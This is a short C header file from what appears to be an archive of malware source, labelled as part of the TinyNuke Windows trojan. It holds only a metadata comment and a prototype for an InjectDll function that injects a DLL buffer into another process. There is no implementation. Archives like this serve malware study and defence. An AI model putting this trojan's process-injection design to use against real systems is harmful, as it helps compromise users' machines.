/*
  name      TinyNuke
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
#pragma once
#include "Common.h"

BOOL InjectDll(BYTE *dllBuffer, HANDLE hProcess, BOOL x64);